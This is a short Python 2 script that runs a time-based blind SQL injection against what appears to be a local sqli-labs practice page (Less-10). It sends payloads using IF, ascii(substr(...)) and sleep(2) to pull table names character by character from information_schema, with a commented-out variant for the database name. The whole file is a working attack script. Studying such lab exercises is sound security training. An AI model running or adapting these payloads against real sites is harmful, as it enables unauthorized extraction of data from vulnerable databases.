# # -*- coding:utf-8 -*-

import requests
import string
import datetime
import time

header = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
url = "http://127.0.0.1/sqli/Less-10/"

data = string.digits+string.lowercase

length = ""
def load(url):
    global length
    for j in range(1,10):
        for i in xrange(48,126):
            starttime = datetime.datetime.now()
            # response = requests.get(url+'?id=1" and if(ascii(substr((select database() limit 0,1),{a},1))={b},sleep(2),null)%23'.format(a=j,b=i),headers=header)
            response = requests.get(url+'?id=1" and If(ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 3,1),{a},1))={b},sleep(2),NULL) %23'.format(a=j,b=i),headers=header)
            # response=response.text
            # sprint response
            endtime = datetime.datetime.now()
            if (endtime - starttime).seconds >= 2:
                length = length+chr(i)
                print length
                break

load (url)